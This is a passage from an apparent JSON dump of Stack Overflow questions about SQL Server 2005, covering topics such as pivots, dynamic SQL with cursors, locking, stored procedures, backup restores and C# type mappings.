'lesson_3' Then 5 \n WHEN lessonID = 'lesson_novid_3' Then 6 \n WHEN lessonID = 'lesson_4' Then 7 \n WHEN lessonID = 'lesson_novid_4' Then 8 \n WHEN lessonID = 'lesson_5' Then 9 \n WHEN lessonID = 'lesson_novid_5' Then 10 \n WHEN lessonID = 'lesson_6' Then 11 \n WHEN lessonID = 'lesson_novid_6' Then 12\n WHEN lessonID = 'lesson_7' Then 13 \n WHEN lessonID = 'lesson_novid_7' Then 14\n WHEN lessonID = 'lesson_8' Then 15\n WHEN lessonID = 'lesson_novid_8' Then 16\n WHEN lessonID = 'lesson_9' Then 17\n WHEN lessonID = 'lesson_novid_9' Then 18\n WHEN lessonID = 'lesson_10' Then 19\n WHEN lessonID = 'lesson_novid_10' Then 20\n WHEN lessonID = 'lesson_11' Then 21\n WHEN lessonID = 'lesson_novid_11' Then 22 \n WHEN lessonID = 'lesson_12' Then 23 \n WHEN lessonID = 'lesson_novid_12' Then 24\nEnd ASC\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":3,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":1174,"score":3,"question_id":759559,"title":"SQL Server Stored Proc takes (much) longer to run than the same query executed from text in Management Studio","body":"<p>So here is a bit of a strange one...\nI have a stored proc that takes 40 seconds to run.\nI copy the contents of the stored proc to a new query window, change the 2 input parameters (which are both dates) so they are declared and set, and run the query. It is basically instant, sub 1 second execution.\nThe only difference is the stored proc takes the 2 dates as parameters.</p>\n\n<p>Anyone got any idea what can make that happen?</p>\n\n<p>(I am running SQL Server 2005)</p>\n"},{"tags":["sql-server","sql-server-2005","tsql","pivot"],"answer_count":2,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":1131,"score":1,"question_id":308908,"title":"How can I use an SQL Pivot for this?","body":"<p>I have a data set that is organized in the following manner:</p>\n\n<pre><code>Timestamp|A0001|A0002|A0003|A0004|B0001|B0002|B0003|B0004 ...\n---------+-----+-----+-----+-----+-----+-----+-----+-----\n2008-1-1 |  1  |  2  | 10  |   6 |  20 |  35 | 300 |  8\n2008-1-2 |  5  |  2  |  9  |   3 |  50 |  38 | 290 |  2    \n2008-1-4 |  7  |  7  | 11  |   0 |  30 |  87 | 350 |  0\n2008-1-5 |  1  |  9  |  1  |   0 |  25 | 100 |  10 |  0\n...\n</code></pre>\n\n<p>Where A0001 is Value A of item #1 and B0001 is Value B of item #1.  There can be over 60 different items in a table, and each item has an A value column and a B value column, meaning a total of over 120 columns in the table.</p>\n\n<p>Where I want to get to is a 3 column result (Item index, A Value, B Value) that sums the A and B values for each item:</p>\n\n<pre><code>Index | A Value | B Value\n------+---------+--------\n 0001 |   14    |   125\n 0002 |   20    |   260\n 0003 |   31    |   950\n 0004 |    9    |    10\n .... \n</code></pre>\n\n<p>As I am going from columns to rows I would expect a pivot in the solution, but I am not sure of how to flesh it out.  Part of the issue is how to strip out the A's and B's to form the values for the Index column.  The other part is that I have never had to use a Pivot before, so I am stumbling over the basic syntax as well.</p>\n\n<p>I think that ultimately I need to have a multi step solution that first builds the summations as:</p>\n\n<pre><code>ColName | Value\n--------+------\nA0001   |  14\nA0002   |  20\nA0003   |  31\nA0004   |   9\nB0001   | 125\nB0002   | 260\nB0003   | 950\nB0004   |  10\n</code></pre>\n\n<p>Then modify the ColName data to strip out the index:</p>\n\n<pre><code>ColName | Value | Index | Aspect\n--------+-------+-------+-------\nA0001   |  14   | 0001  |  A\nA0002   |  20   | 0002  |  A\nA0003   |  31   | 0003  |  A\nA0004   |   9   | 0004  |  A\nB0001   | 125   | 0001  |  B\nB0002   | 260   | 0002  |  B\nB0003   | 950   | 0003  |  B\nB0004   |  10   | 0004  |  B\n</code></pre>\n\n<p>Finally self join to move the B values up next to the A Values.</p>\n\n<p>This seems to be a long winded process to get what I want.  So I am after advice as to whether I am headed down the right path, or is there another approach that I have over looked that will make my life so much easier.</p>\n\n<p>Note 1) The solution has to be in T-SQL on MSSQL 2005.</p>\n\n<p>Note 2) The format of the table cannot be changed.</p>\n\n<p><strong>Edit</strong> Another method I have thought about uses UNIONs and individual SUM()s on each column:</p>\n\n<pre><code>SELECT '0001' as Index, SUM(A0001) as A, SUM(B0001) as B FROM TABLE\nUNION\nSELECT '0002' as Index, SUM(A0002) as A, SUM(B0002) as B FROM TABLE\nUNION\nSELECT '0003' as Index, SUM(A0003) as A, SUM(B0003) as B FROM TABLE\nUNION\nSELECT '0004' as Index, SUM(A0004) as A, SUM(B0004) as B FROM TABLE\nUNION\n...\n</code></pre>\n\n<p>But this approach really doesn't look very nice either</p>\n\n<p><strong>EDIT</strong>  So far there are 2 great responses.  But I would like to add two more conditions  to the query :-)  </p>\n\n<p>1) I need to select the rows based on a range of timestamps (minv &lt; timestamp &lt; maxv). </p>\n\n<p>2) I also need to conditionally select rows on a UDF that processes the timestamp</p>\n\n<p>Using Brettski's table names, would the above translate to:</p>\n\n<pre><code>...\n(SELECT A0001, A0002, A0003, B0001, B0002, B0003 \n FROM ptest \n WHERE timestamp&gt;minv AND timestamp&lt;maxv AND fn(timestamp)=fnv) p\nunpivot\n(val for item in (A0001, A0002, A0003, B0001, B0002, B0003)) as unpvt\n...\n</code></pre>\n\n<p>Given that I have conditionally add the fn() requirement, I think that I also need to go down the dynamic SQL path as proposed by Jonathon.  Especially as I have to build the same  query for 12 different tables - all of the same style.</p>\n"},{"tags":["sql","sql-server-2005","cursor","execute","dynamic-sql"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":79,"score":1,"question_id":11833561,"title":"Is there a better way to execute dynamic SQL that doesn't use a cursor?","body":"<p>I have dynamic SQL stored in a SQL table that I have to execute under certain conditions. Currently, we use cursors to handle that for us, but I was always told to avoid cursors when possible as they aren't the most efficient way of doing things. So, my question is: how do I execute dynamic SQL without them (if there's a way)? The entire system is built around this dynamic SQL mess, so there is no changing it. </p>\n\n<p>For this, just assume the table has <code>Id AS IDENTITY</code> and <code>SQL AS VARCHAR</code> fields, where the SQL field contains the SQL to be executed (obviously). </p>\n\n<p><strong>EDIT:</strong> \nBasically, I want to loop through the table and execute the SQL in the SQL column.</p>\n\n<p>So, a row in the table will basically look like this:</p>\n\n<pre><code>ID   SQL\n--   ----------------------\n1    SELECT * FROM RECORD\n2    SELECT * FROM PERSON\n3    SELECT * FROM LOCATION\n</code></pre>\n\n<p>I haven't written any code because what I'd write is a cursor to traverse through the table and execute it. I just don't know of any other ways of looping a table and executing that string as a SQL query other than something like:</p>\n\n<pre><code>DECLARE @sql VARCHAR(MAX)\n\nDECLARE _cursor CURSOR\nFOR\n    SELECT  [SQL]\n    FROM    #tmp2\n\nOPEN _cursor\n\nFETCH NEXT FROM _cursor INTO @sql\n\nWHILE @@FETCH_STATUS = 0 \n    BEGIN\n        PRINT ( @sql )\n    END\nCLOSE _cursor   \nDEALLOCATE _cursor\n</code></pre>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":460,"score":3,"question_id":7789100,"title":"How to throw exception from SQL server 2005 function?","body":"<p>When I try to use RaiseError, I get the following compilation issue </p>\n\n<blockquote>\n  <p>Msg 443, Level 16, State 14, Procedure ConvertSessionToCurr, Line 19\n  Invalid use of a side-effecting operator 'RAISERROR' within a\n  function.</p>\n</blockquote>\n\n<p>So how do we handle exception in a function/ Change it to a out param stored proc? That really  sounds like a bummer!</p>\n"},{"tags":["sql-server","sql-server-2005","ssis"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":234,"score":0,"question_id":11813768,"title":"Stubborn column data type in SSIS flat flat file connection manager won't change. :(","body":"<p>I have inherited an existing SSIS package that imports flat file data into my SQL Server 2005 database. I need to change the data type of the \"Gross Sales\" column from \"numeric\" to \"currency\". When I change the data type and export the package the data type remains numeric. </p>\n\n<p>I have also tried creating a new flat file connection to use in the same package, but for some strange reason it still remains numeric instead of \"cy\" currency. I guess there is something \"stuck\" in some other area that is forcing the last column to remain numeric?</p>\n\n<p>Does anyone know the trick to changing the data type for a flat file data source?</p>\n"},{"tags":["sql","sql-server-2005","recursive-query","tree-search"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":118,"score":1,"question_id":11762066,"title":"T-SQL Tree Search Select from set of nodes if they are under a parent","body":"<p>T-SQL Tree Search </p>\n\n<p>Select from set of nodes if they are under a parent</p>\n\n<p>I have a very large tree in a MSSQL Db (80000+) records. My client has requested a quick search of the tree via a text <code>LIKE</code> command.  The <code>LIKE</code> command returns &lt; 500 records. </p>\n\n<p>Is there some recursive command that will check the tree of each quickly to see if they are under a particular node?</p>\n\n<p>Edit:\nI thought it was fairly clear however....</p>\n\n<p>I am on SQL Server 2005.</p>\n\n<pre><code>Table Schema\n - (pK) Id\n - (fK) ParentId\n - FirstName\n - LastName\n</code></pre>\n\n<p>I have recursive calls that are able to go down several levels quickly. however to do the Name search I would have to poll the entire tree which can be several hundred levels deep and is not an option. I was hoping for help designing a query so I can search the entire table first for the name match and filter the records that are not part of the tree in question.</p>\n"},{"tags":["sql","sql-server","performance","sql-server-2005","locking"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":108,"score":1,"question_id":11829529,"title":"SQL Server - does [SELECT] lock [UPDATE]?","body":"<p>I have a complex select query and a huge table.</p>\n\n<p>I'm running this <code>select</code> statement, meanwhile an <code>Update</code> statement arrives and tries to <em>update</em> the table.</p>\n\n<p>IMHO - update requires an <em>exclusive</em> lock - so the update statement will have to <em>wait</em> till the select command is finished.</p>\n\n<ol>\n<li><p>Am I right ?</p></li>\n<li><p>what can I do in order to: execute the complex <code>select</code>, <strong>and</strong> also let the <code>update</code> command run (<em>currently I don't care about dirty data</em>)</p></li>\n</ol>\n"},{"tags":["sql-server","sql-server-2005","stored-procedures"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":89,"score":0,"question_id":11825499,"title":"How to execute SQL Server 2005 generated database query on SQL Server 2008?","body":"<p>I need to execute a SQL Server 2005 generated database query (mostly stored procedures) in to SQL Server 2008. Is there anything that I need to keep in mind while doing this process...?</p>\n\n<p>When I do above process, script does not execute...</p>\n\n<p>Please help me in this problem</p>\n\n<p>Nilesh Pethani</p>\n\n<p>Sorry for including code in comment...</p>\n\n<p>Here is the sample procedure i use to execute without the any SET command, but still it is not working...</p>\n\n<pre><code>CREATE  PROCEDURE [dvx_web_MICROSITES_LoadMicrosites]\nAS\nBEGIN\n    SELECT\n        microsite_id AS ID,\n        url as URL,\n        [name] as [Name],\n        catery_id as CateryID,\n        catery_code as CateryCode,\n        banner_key as Banner,   \n        main_banner_key as MainBanner,\n        special_zone_id as SpecialZone,\n        homepage_url as MainLink,\n        active as Active,\n        custom_01 as Custom01,\n        custom_02 as Custom02,\n        custom_03 as Custom03,\n        custom_04 as Custom04,\n        custom_05 as Custom05\n    FROM\n        Microsites\n    WHERE\n        Active = 1\n    ORDER BY [Name] ASC\nEND\n</code></pre>\n"},{"tags":["sql-server","tsql","sql-server-2005","stored-procedures"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":11825410,"title":"SQL Server 2005 Working with tables and nested exec-inserts in procedures","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/3795263/errors-insert-exec-statement-cannot-be-nested-and-cannot-use-the-rollback-s\">Errors: &ldquo;INSERT EXEC statement cannot be nested.&rdquo; and &ldquo;Cannot use the ROLLBACK statement within an INSERT-EXEC statement.&rdquo; How to solve this?</a>  </p>\n</blockquote>\n\n\n\n<p>I got some issues in SQL Server 2005 when working with tables in procedures:</p>\n\n<p>First I wrote a small function that evaluates the columns of given table and returns their datatype and (in case of (n)varchar) the maximum length by executing</p>\n\n<pre><code>select max(len(...))\n</code></pre>\n\n<p>Because the procedure has to build an exec string, I have to use a stored procedure even though no data is modified, but whatever, I can work with that; the stored procedure collects data into a temporary table and then just selects everything at the end.</p>\n\n<p>Next, a small function that uses the column-information from the previous function to create </p>\n\n<pre><code>ALTER COLUMN ... \n</code></pre>\n\n<p>statements; for example </p>\n\n<pre><code>BEGIN TRY \n  IF EXISTS ( SELECT * FROM [INFORMATION_SCHEMA].[COLUMNS] WHERE [TABLE_SCHEMA] = 'someSchema' AND [TABLE_NAME] = 'someTable' AND [COLUMN_NAME] = 'someColumn' ) \n  BEGIN \n    ALTER TABLE [someSchema].[someTable] ALTER COLUMN [someColumn] nvarchar(20) \n  END \nEND TRY \nBEGIN CATCH \n  PRINT 'Unable to alter column [someColumn]: ' + ERROR_MESSAGE(); \nEND CATCH\n</code></pre>\n\n<p>To do this, I create a temporary table and <code>INSERT EXEC</code> into it from the previous function to get the lengths of the columns, then run over the results with a cursor and create the statements, write them into another temporary table and select everything at the end.</p>\n\n<p>Now the problematic part:<br>\nSay I want to write another function that executes the create statement procedure for every table in the database. Normally, I just would write a cursor for the <code>information_schema.tables</code> and keep calling my procedure, inserting the results into a table and selecting everything.</p>\n\n<p>HOWEVER, for some reason, SQL Server prevents me from using a nested insert exec, even though there are no circular dependencies whatsoever; one function uses another one further down the food-chain.</p>\n\n<p>Is there some good way to circumvent this?</p>\n\n<p>Kind regards, \nFrank</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":11824749,"title":"Convert Sql Server Query from In -> Exists?","body":"<p>I want to convert this query : </p>\n\n<pre><code>SELECT *\nFROM   myTable\nWHERE   dateCreated = (\n                       SELECT MAX(dateCreated)\n                       FROM   myTable\n                      )\n      AND duty IS NULL\n      AND CompanyPayingId   IN \n                                  (43081 ,43082 ,43084 ,43085)\n</code></pre>\n\n<p>to change from <code>in</code> to <code>Exists</code> query ( due to performance) : </p>\n\n<p>However I'm having trouble converting the code cause I think I'll have to duplicate the <em>where</em> clause...</p>\n\n<p>How can I convert this code ?</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":110,"score":0,"question_id":11681442,"title":"How calculate the week if there are 5 weeks in one month?","body":"<p>i have problem to calculate the week where the data just display four week. How calculate if there are five week?. i don't know how to do.\nAnybody know about this?.:(</p>\n"},{"tags":["sql-server-2005","jobs","scheduling"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":475,"score":2,"question_id":5432378,"title":"Are end dates for sql server job schedules inclusive or exclusive","body":"<p>I have a schedule that does something daily, every two hours in a time interval. I want to set an end date for this schedule, but I'm wondering if it is inclusive or exclusive. In other words, if I set the end date at march 26, will today be the last day it runs, or tomorrow (it is march 25 today).</p>\n"},{"tags":["sql","sql-server","sql-server-2005","blob"],"answer_count":5,"favorite_count":6,"up_vote_count":12,"down_vote_count":0,"view_count":18362,"score":12,"question_id":1643627,"title":"How to insert a blob into a database using sql server management studio","body":"<p>How can I easily insert a blob into a varbinary(MAX) field?</p>\n\n<p>for argument sake:</p>\n\n<p>assume the thing I want to insert is: c:\\picture.png\nthe table is mytable\nthe column is mypictureblob\nand the place is recid=1</p>\n\n<p>I've been googling for some time and I can't find a simple solution</p>\n\n<p>thanks!</p>\n"},{"tags":["sql-server","sql-server-2005","sql-server-2008","ado.net","connection-string"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":475,"score":1,"question_id":2265886,"title":"How can I create valid connection string by using shared memory protocol to connect a named instance of sql server?","body":"<p>How can I create a valid connection string by using shared memory protocol to connect a named instance of sql server while the sql server browser is disabled?</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":148,"score":0,"question_id":3988868,"title":"Block tsql updates with missing WHERE clause","body":"<p>In the context of MS SQL Server 2005</p>\n\n<p>Is there a way to stop delete, and update sql statements being executed against the database that don't have a WHERE clause?</p>\n\n<p>Ideally it would be nice to restrict this 'blocking' to a set of users/roles.</p>\n"},{"tags":["sql-server-2005","database-design"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":11814245,"title":"SQL Modeling (one to many) in SQL Server 2005","body":"<p>I have a <code>product</code> table:</p>\n\n<pre><code>ProdId(PK)\nProd1\nProd2\nProd3 \nProd4    \n</code></pre>\n\n<p>and <code>Certification</code> table:</p>\n\n<pre><code>Certification(PK):\nCert1\nCert2\nCert3\n</code></pre>\n\n<p>I need to model <code>ProdwithCert</code> relation (pseudo table) as follows:</p>\n\n<pre><code>ProdwithCertId(PK)              ProdwithCert\nProdwithCert1                   \"Prod1 with Cert1\"\nProdwithCert2                   \"Prod1 with Cert1, Cert2\"\nProdwithCert3                   \"Prod1 with Cert1, Cert2, Cert3\"\nProdwithCert4                   \"Prod2 with Cert1, Cert2\"\nProdwithCert5                   \"Prod2 with Cert1, Cert2, Cert3\"\n</code></pre>\n\n<p><strong>Following are the constraints:</strong></p>\n\n<ol>\n<li>Cannot have duplicates, e.g. in above table, <code>ProdwithCert6 - \"Prod2 with Cert1, Cert2, Cert3\"</code> is not allowed</li>\n<li><code>Product</code> has at least one <code>Certification</code></li>\n</ol>\n\n<p>How do I properly model <code>ProdwithCert</code> relation in SQL Server 2005?  </p>\n\n<p>Thanks</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":431,"score":1,"question_id":5431301,"title":"Scheduling job in sql server mgmt studio to run for 'x' days in a month","body":"<p>How do I run a job in Sql Server Agent in (SQL Server Management Studio) for 'x' number of days in a month?</p>\n\n<p>eg: Every 1st.2nd and 3rd of every month</p>\n\n<p>The problem is I am not sure of these days! The user will specify the 'x' number of days!</p>\n\n<p>For instance, the user feels for the month of April he wants the job to be scheduled on 'x' days. Here x= 1st,2nd and 4th of April.</p>\n\n<p>And for the month May he feels to schedule on 'x' days. Here x= 7th,8th and 10th!</p>\n\n<p>Is it possible to schedule in such a way?</p>\n\n<p>Is there any script to schedule this???</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":4,"view_count":160,"score":-3,"question_id":9771953,"title":"The multi part identifier could not be bound","body":"<pre><code>SELECT * FROM Products_Joined, Products \nWHERE p.ProductManufacturer = 'Sony' \nORDER BY p.ProductCode\n</code></pre>\n\n<p>I keep getting the error <em>The multi part identifier p.ProductManufacturer could not be bound</em> </p>\n\n<p>I tried:</p>\n\n<ul>\n<li>Setting the <code>Order By</code></li>\n<li>Adding the <code>PRODUCTS</code> table to the <code>FROM</code> </li>\n</ul>\n\n<p>Is there something I'm missing?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql","sql-server-2008"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":6962068,"title":"Probem with Update Statement","body":"<p>I Have two tables called ASI and Call and the data in the tables looks like:</p>\n\n<p>Call</p>\n\n<pre><code>ID   Flag  Created_ON\n12   1     2011-08-05 11:48:09.477\n15   1     2011-08-05 11:48:09.477\n18   1     2011-08-05 11:48:09.477\n20   1     2011-08-05 11:48:09.477\n25   1     2010-08-12 14:05:11.000\n</code></pre>\n\n<p>ASI</p>\n\n<pre><code>ID  Open_Date\n12  2010-07-02 09:40:00.000\n20  2010-08-12 14:05:11.000\n18  2010-08-09 15:26:43.000\n</code></pre>\n\n<p>I want to update the Flag column in Call table with 0 where the ID is not present in ASI Table. In the above example I want ID's 15 and 25 to be 0.</p>\n\n<p>Output:</p>\n\n<pre><code>ID   Flag  Created_ON\n12   1     2011-08-05 11:48:09.477\n15   0     2011-08-05 11:48:09.477\n18   1     2011-08-05 11:48:09.477\n20   1     2011-08-05 11:48:09.477\n25   0     2010-08-12 14:05:11.000\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005","ms-access"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":129,"score":1,"question_id":11803394,"title":"Access front end SQL back end secure connection","body":"<p>I need to have an Access front end and SQL 2005 back end for a client. I would like to require them to have a static IP and I'll open a port for that IP. But they also want to be mobile, so their IP will change when they aren't in their office. </p>\n\n<p>Is there another way to secure the connection? </p>\n\n<p>Thanks. </p>\n"},{"tags":["sql-server-2005","vistadb"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":11809494,"title":"Vistadb SQL Syntax error","body":"<p>vistadb4 not recognize this sql view script. but it is working with sql2005. is there a solution ? thanks.</p>\n\n<pre><code>SELECT DISTINCT ItemCode, SellingPrice\nFROM         dbo.SalesPurchases AS a\nWHERE     (KeyID =\n                          (SELECT     TOP (1) MAX(KeyID) AS KeyID\n                            FROM          dbo.SalesPurchases AS b\n                            GROUP BY ItemCode, Type\n                            HAVING      (ItemCode = a.ItemCode) AND (Type = 'purchase')))\nGROUP BY ItemCode, SellingPrice\n</code></pre>\n"},{"tags":["html","sql-server-2005","autocomplete"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":11804252,"title":"Converting to a stored procedure","body":"<p>I currently have a query string for the jQuery Autocomplete plug in but should be using a stored procedure instead. Can anyone help me convert? It seems to not be working when I do it.</p>\n\n<p>Original ASHX</p>\n\n<pre><code>public class Search_CS : IHttpHandler {\n\npublic void ProcessRequest (HttpContext context) {\n    string prefixText = context.Request.QueryString[\"q\"];\n    using (SqlConnection conn = new SqlConnection())\n    {\n        conn.ConnectionString = ConfigurationManager\n                .ConnectionStrings[\"Rollup2ConnectionString\"].ConnectionString;\n        using (SqlCommand cmd = new SqlCommand())\n        {\n            //cmd.CommandText = \"select NUID from T_USER where \" +\n            //\"NUID like @SearchText + '%'\";\n            cmd.CommandText = \"select rtrim(NUID) NUID, rtrim(FNAME) FNAME, rtrim(LNAME) LNAME from T_USER where NUID like @SearchText + '%' OR FNAME like @SearchText + '%' OR LNAME like @SearchText + '%'\"; \n            cmd.Parameters.AddWithValue(\"@SearchText\", prefixText);\n            cmd.Connection = conn;\n            StringBuilder sb = new StringBuilder(); \n            conn.Open();\n            using (SqlDataReader sdr = cmd.ExecuteReader())\n            {\n                while (sdr.Read())\n                {\n                    sb.Append(sdr[\"NUID\"].ToString() + \" \").Append(sdr[\"FNAME\"].ToString() + \" \").Append(sdr[\"LNAME\"].ToString() + \" \")\n                        .Append(Environment.NewLine); \n                }\n            }\n            conn.Close();\n            context.Response.Write(sb.ToString()); \n        }\n    }\n}\n</code></pre>\n\n<p>New ASHX for stored procedure:</p>\n\n<pre><code>public class Search_CS : IHttpHandler {\n\npublic void ProcessRequest (HttpContext context) {\n    string prefixText = context.Request.QueryString[\"q\"];\n    using (SqlConnection conn = new SqlConnection())\n    {\n        conn.ConnectionString = ConfigurationManager\n                .ConnectionStrings[\"Rollup2ConnectionString\"].ConnectionString;\n        using (SqlCommand cmd = new SqlCommand())\n        {\n            //cmd.CommandText = \"select NUID from T_USER where \" +\n            //\"NUID like @SearchText + '%'\";\n            cmd.CommandText = \"SP_AUTOCOMPLETE\"; \n            cmd.Parameters.AddWithValue(\"@SearchText\", prefixText);\n\n            cmd.Parameters.Add(new SqlParameter(\"@SearchText\", SqlDbType.VarChar));\n            cmd.Parameters[\"@SearchText\"].Value = prefixText;\n\n\n            cmd.Connection = conn;\n            StringBuilder sb = new StringBuilder(); \n            conn.Open();\n            using (SqlDataReader sdr = cmd.ExecuteReader())\n            {\n                while (sdr.Read())\n                {\n                    sb.Append(sdr[\"NUID\"].ToString() + \" \").Append(sdr[\"FNAME\"].ToString() + \" \").Append(sdr[\"LNAME\"].ToString() + \" \")\n                        .Append(Environment.NewLine); \n                }\n            }\n            conn.Close();\n            context.Response.Write(sb.ToString()); \n        }\n    }\n}\n</code></pre>\n\n<p>Stored procedure:</p>\n\n<pre><code>@SearchText VARCHAR(255)\nAS\nBEGIN\n\n    SET NOCOUNT ON;\n    SELECT RTRIM(NUID) NUID, RTRIM(FNAME) FNAME, RTRIM(LNAME) LNAME \n    FROM T_USER \n    WHERE NUID like @SearchText + '%' OR FNAME like @SearchText + '%' OR LNAME like @SearchText + '%'\n</code></pre>\n\n<p>Thanks!</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":115,"score":0,"question_id":11804172,"title":"Remove duplicate rows on a SQL query","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/119896/duplicate-result\">Duplicate result</a><br>\n  <a href=\"http://stackoverflow.com/questions/7649498/interview-detect-remove-duplicate-entries\">Interview - Detect/remove duplicate entries</a>  </p>\n</blockquote>\n\n\n\n<p>I have a SQL Query, which returns a table with one column.</p>\n\n<p>The returned data may be duplicate. for example, my query may be something like:</p>\n\n<pre><code>SELECT item FROM myTable WHERE something = 3\n</code></pre>\n\n<p>and the returned data may be something like this:</p>\n\n<pre><code>item\n-----\n2\n1\n4\n5\n1\n9\n5\n</code></pre>\n\n<p><strong>My Question is, How to remove duplicated items from my query?</strong></p>\n\n<p>I mean, I want to get these results:</p>\n\n<pre><code>item\n-----\n2\n1\n4\n5\n9\n</code></pre>\n\n<p>Please note that I <strong>don't</strong> want to change or delete any rows <strong>in table.</strong> I just want to remove duplicates <strong>in that query</strong>.</p>\n\n<p>How to do that?</p>\n"},{"tags":["sql-server","sql-server-2005","tsql"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":1357,"score":2,"question_id":962441,"title":"Microsoft SQL Server, restore a backup of a database with one command","body":"<p>When we copy a database down from production, we make a backup of the database, zip it up and copy the backup down. Then we have to restore using the SQL Server GUI, which involves navigating through several menus and windows. As far as I know, you can not do this with SQL Server's built in stored procedures because you may not know the <code>logical filename</code> of the database (which is required to restore). So doing this via query consists of the following:</p>\n\n<pre><code>RESTORE FILELISTONLY\nFROM DISK = 'C:\\backup_of_production_database.bak'\nGO\n</code></pre>\n\n<p>The above provides the logical file names from the backup file, you then have to use these logical names in the next query...</p>\n\n<pre><code>RESTORE DATABASE NewDevelopmentDatabase\nFROM DISK = 'C:\\backup_of_production_database.bak'\nWITH MOVE 'YourMDFLogicalName' TO 'C:\\mssql\\data\\DataYourMDFFile.mdf',\nMOVE 'YourLDFLogicalName' TO 'C:\\mssql\\data\\DataYourLDFFile.mdf'\n</code></pre>\n\n<p>As you can see this seems inefficient because you must manually enter the logical file names into the next query.</p>\n\n<p>You can find my solution to this problem as an answer below.</p>\n"},{"tags":["c#",".net","sql-server-2005"],"answer_count":3,"favorite_count":55,"up_vote_count":72,"down_vote_count":4,"view_count":40688,"score":68,"question_id":425389,"title":"C# Equivalent of SQL Server 2005 DataTypes","body":"<p>For the following SQL Server 2005 datatypes, what would be the corresponding datatype in C#?</p>\n\n<p><strong>Exact Numerics</strong></p>\n\n<pre><code>bigint\nnumeric\nbit\nsmallint\ndecimal\nsmallmoney\nint\ntinyint\nmoney\n</code></pre>\n\n<p><hr /></p>\n\n<p><strong>Approximate Numerics</strong></p>\n\n<pre><code>float\nreal\n</code></pre>\n\n<p><hr /></p>\n\n<p><strong>Date and Time</strong></p>\n\n<pre><code>date\ndatetimeoffset\ndatetime2\nsmalldatetime\ndatetime\ntime\n</code></pre>\n\n<p><hr /></p>\n\n<p><strong>Character Strings</strong></p>\n\n<pre><code>char\nvarchar\ntext\n</code></pre>\n\n<p><hr /></p>\n\n<p><strong>Unicode Character Strings</strong></p>\n\n<pre><code>nchar\nnvarchar\nntext\n</code></pre>\n\n<p><hr /></p>\n\n<p><strong>Binary Strings</strong></p>\n\n<pre><code>binary\nvarbinary\nimage\n</code></pre>\n\n<p><hr /></p>\n\n<p><strong>Other Data Types</strong></p>\n\n<pre><code>cursor\ntimestamp\nhierarchyid\nuniqueidentifier\nsql_variant\nxml\ntable\n</code></pre>\n\n<p>(source: <a href=\"http://msdn.microsoft.com/en-us/library/ms187752.aspx\" rel=\"nofollow\">MSDN</a>)</p>\n"},{"tags":["sql-server","sql-server-2005","sql-server-2005-express"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":116,"score":0,"question_id":11793414,"title":"Generate script in SQL Server 2005 with data","body":"<p>How can I generate a script in SQL Server 2005 with data in table?</p>\n"},{"tags":["tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":11783493,"title":"I need to temporarily \"store\" info, or put a query in a query and do an insert into SQL Server 2005","body":"<p>So I have 2 tables that I need to insert similar data into. They are employee DBs that different applications access. They are:</p>\n\n<ul>\n<li>dbo_Employees</li>\n<li>dbo_EmpDefaultSchedules</li>\n<li>dbo_EmpUsers</li>\n<li>dbo_EmpDefaultLocation</li>\n</ul>\n\n<p>So on <code>dbo_Employees</code>, when you insert a row, the primary key is auto-created. That column is called <code>EmpID</code>. There are a total of around 22 different columns being added to these different tables. They are things like <code>FirstName</code>, <code>LastName</code>, <code>Address</code>, <code>Phone</code>, etc., etc.</p>\n\n<p>I'm trying to create a script where I can take a list of variables, enter them in once, and run that script to add it to the 4 tables at once (eventually a web page that HR will enter the info and create it themselves)</p>\n\n<p>The only one that is giving me trouble is <code>dbo_EmpDefaultSchedules</code>. This is because I need the primary key from <code>dbo_Employees</code> (<code>EmpID</code>) to insert into <code>dbo_EmpDefaultSchedules</code>, and obviously it's not created until the first part of the script runs. My insert statement for the second part is this:</p>\n\n<pre><code>INSERT INTO 